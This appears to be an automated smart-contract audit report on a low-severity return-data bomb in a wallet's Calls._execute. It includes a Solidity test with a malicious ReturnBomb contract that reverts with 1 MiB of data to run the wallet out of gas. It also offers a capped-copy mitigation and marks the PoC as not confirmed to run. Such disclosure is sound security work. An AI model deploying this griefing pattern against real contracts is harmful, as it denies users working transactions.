# 2025 10 sequence - Findings Report
## Commit hash: b0e5fb15bf6735ec9aaba02f5eca28a7882d815d

##Findings by Pattern


 **Derived From** : Unbounded returndata copy lets callees return-bomb DoS on failure (events/revert)

[L-1]. Return-data bomb in Calls._execute lets any callee OOG the wallet on failure handling, breaking batches and DoSing execution
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 5
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 0
- M: 0
- L: 1
- I: 0

##Findings by Pattern


 **Derived From** : Unbounded returndata copy lets callees return-bomb DoS on failure (events/revert)

## [L-1]. Return-data bomb in Calls._execute lets any callee OOG the wallet on failure handling, breaking batches and DoSing execution

### Finding Severity Justification: Unbounded copying of returndata in Calls._execute via LibOptim.returnData() can cause out-of-gas when a callee returns or reverts with very large returndata, breaking the current batch (even for IGNORE_ERROR) and wasting gas. However, impact is limited to the single transaction; no funds are lost and no persistent state is corrupted. It also requires the wallet owners to include an untrusted/malicious target in their payload, and can be mitigated by specifying per-call gas limits. Therefore this is a gas-grief/availability issue, not an asset-loss bug.
## Derived From Pattern/Invariant
Unbounded returndata copy lets callees return-bomb DoS on failure (events/revert)

## Exploit Type
Dos

## Location
Calls._execute

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 5
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
When an external call fails in Calls._execute, the code copies the full returndata via LibOptim.returnData() and either emits it in CallFailed/CallAborted or bubbles it in a revert. LibOptim.returnData() copies returndatasize() bytes into memory without any cap. A malicious target can revert with very large returndata, causing memory expansion and copy costs to exhaust gas during event emission or revert propagation. This breaks the intended behavior (e.g., IGNORE_ERROR should continue) and DoSes the batch execution. Vulnerable snippet:

if (!success) {
  if (call.behaviorOnError == Payload.BEHAVIOR_IGNORE_ERROR) {
    errorFlag = true;
    emit CallFailed(_opHash, i, LibOptim.returnData());
    continue;
  }
  if (call.behaviorOnError == Payload.BEHAVIOR_REVERT_ON_ERROR) {
    revert Reverted(_decoded, i, LibOptim.returnData());
  }
  if (call.behaviorOnError == Payload.BEHAVIOR_ABORT_ON_ERROR) {
    emit CallAborted(_opHash, i, LibOptim.returnData());
    break;
  }
}

LibOptim.returnData(): copies returndatasize() bytes to memory with no upper bound.

## Impact
A called contract can deliberately revert with very large returndata so that Calls._execute copies and logs it unbounded via LibOptim.returnData(), exhausting gas during memory expansion and event emission (8 gas/byte). This causes the entire batch to revert even when behaviorOnError=IGNORE_ERROR, breaking intended semantics, wasting gas, and enabling DoS of wallet operations that include untrusted targets. The same pattern exists in Estimator._estimate and Simulator.simulate, so estimation/simulation can also be griefed. There is no direct loss of funds or state corruption, but availability and reliability are significantly impacted.

## Command to Run Test


## Proof of Concept
Idea: Force the wallet to forward most of its gas to a malicious callee that reverts with a 1 MiB payload. When the wallet handles the failure, it unconditionally copies returndata and emits CallFailed(_opHash, i, bytes), incurring both memory expansion and 8 gas/byte for the log data. With a total gas budget of ~5M, a 1 MiB revert reliably causes OOG during event emission, reverting the whole batch despite behaviorOnError=IGNORE_ERROR.

Steps:
1) Deploy ReturnBomb that reverts with exactly 1,048,576 bytes.
2) Build a payload with two calls: (a) external call to ReturnBomb with behaviorOnError=IGNORE_ERROR and no gasLimit, (b) external call to a Counter.inc() target.
3) Execute via selfExecute using an external entry that does an external call to self (to satisfy onlySelf). Send ~5,000,000 gas.
4) The first call fails and the wallet tries to emit CallFailed with the full returndata. Emitting 1 MiB costs >8,388,608 gas for the log data alone, plus memory expansion from LibOptim.returnData(). With only ~5M total gas and some gas already consumed by the callee, this always OOGs within the wallet, reverting the entire batch. The second call is never executed.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {Calls} from "src/modules/Calls.sol";

// Minimal harness to call selfExecute through an external entry
contract CallsHarness is Calls {
  function _isValidImage(bytes32) internal view override returns (bool) { return true; }
  function _updateImageHash(bytes32) internal override {}
  // External entry: performs an external call to self to satisfy onlySelf
  function exec(bytes calldata payload) external {
    this.selfExecute(payload);
  }
}

// Malicious callee: revert with a fixed 1 MiB payload
contract ReturnBomb {
  // 1,048,576 bytes revert data
  uint256 internal constant SIZE = 1_048_576;
  fallback() external payable {
    assembly {
      // Revert with SIZE bytes starting at offset 0x00
      // REVERT will expand memory as needed
      revert(0x00, SIZE)
    }
  }
}

contract Counter {
  uint256 public n;
  function inc() external { n++; }
}

contract ReturnDataBombDeterministicTest is Test {
  CallsHarness wallet;
  ReturnBomb bomb;
  Counter counter;

  function setUp() public {
    wallet = new CallsHarness();
    bomb = new ReturnBomb();
    counter = new Counter();
  }

  function test_ReturnDataBomb_IgnoreError_revertsBatch() public {
    // Build packed payload per Payload.fromPackedCalls format.
    // Global flag: bit0=1 (space=0), nonceSize=0, singleCall=0, countSize=0 => 0x01
    bytes1 global = 0x01;
    // call count = 2 (1 byte)
    bytes1 callCount = 0x02;

    // Call[0]: external to bomb, no value, no data, no gasLimit, delegate=0, onlyFallback=0, behaviorOnError=IGNORE(00)
    bytes1 flags0 = 0x00; // will read address

    // Call[1]: external to counter, with data (inc()), default IGNORE behavior
    bytes1 flags1 = 0x04; // data present
    bytes memory data1 = abi.encodeWithSelector(Counter.inc.selector);
    assertEq(data1.length, 4);

    // Encode payload
    bytes memory payload = abi.encodePacked(
      global,
      callCount,
      // call 0
      flags0, address(bomb),
      // call 1
      flags1, address(counter), bytes3(uint24(data1.length)), data1
    );

    // Execute with ~5M gas to ensure:
    // - callee can prepare 1 MiB revert data
    // - wallet OOGs when copying/logging returndata (8 gas/byte + memory expansion)
    try wallet.exec{gas: 5_000_000}(payload) {
      fail("expected batch revert from return-data bomb during IGNORE_ERROR handling");
    } catch {
      // Expected: entire batch reverts due to OOG in failure handling
    }

    // The benign second call must not have executed
    assertEq(counter.n(), 0, "second call executed unexpectedly");
  }
}


## Suggested Mitigation
Fully eliminate the grief vector by bounding returndata copying and avoiding full-bytes logging on failures:

- Add a capped-return helper and use it everywhere returndata is consumed:
  function returnDataCapped(uint256 max) internal pure returns (bytes memory r) {
    assembly {
      let size := returndatasize()
      if gt(size, max) { size := max }
      r := mload(0x40)
      let start := add(r, 32)
      mstore(0x40, add(start, size))
      mstore(r, size)
      returndatacopy(start, 0, size)
    }
  }

- In Calls._execute (and Estimator/Simulator):
  - IGNORE_ERROR and ABORT_ON_ERROR paths: do not emit the full returndata. Either (a) emit a truncated prefix (e.g., first 4–8 KB) via returnDataCapped(MAX_RET_BYTES), or (b) emit a fixed-size hash (keccak256 of returndata) and a length for observability without copying/logging megabytes.
  - REVERT_ON_ERROR path: revert with a bounded slice (returnDataCapped(MAX_RET_BYTES)) or a standard error plus a hash of the full returndata.

- Pick conservative caps (e.g., MAX_RET_BYTES = 8_192) to bound worst-case gas, and document this behavior.

- Encourage/optionally enforce per-call gasLimit for untrusted targets to further reduce grief surface.

Apply the same truncation policy in Estimator._estimate and Simulator.simulate where LibOptim.returnData() is used.




